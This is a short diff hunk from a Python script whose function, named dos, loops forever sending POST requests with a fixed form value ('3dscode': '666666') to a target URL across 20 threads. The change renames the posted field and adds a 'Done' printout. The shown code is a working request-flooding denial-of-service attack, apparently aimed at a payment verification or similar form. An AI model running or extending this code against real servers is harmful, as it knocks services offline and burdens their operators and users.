@@ -25,7 +25,8 @@ input("Press ENTER to continue ")
 print("")
 def dos(target):
     while True:
-            res = requests.post(url, data={'requesting': '666666',})
+            res = requests.post(url, data={'3dscode': '666666',})
+            print("Done")
 
 threads = 20
 
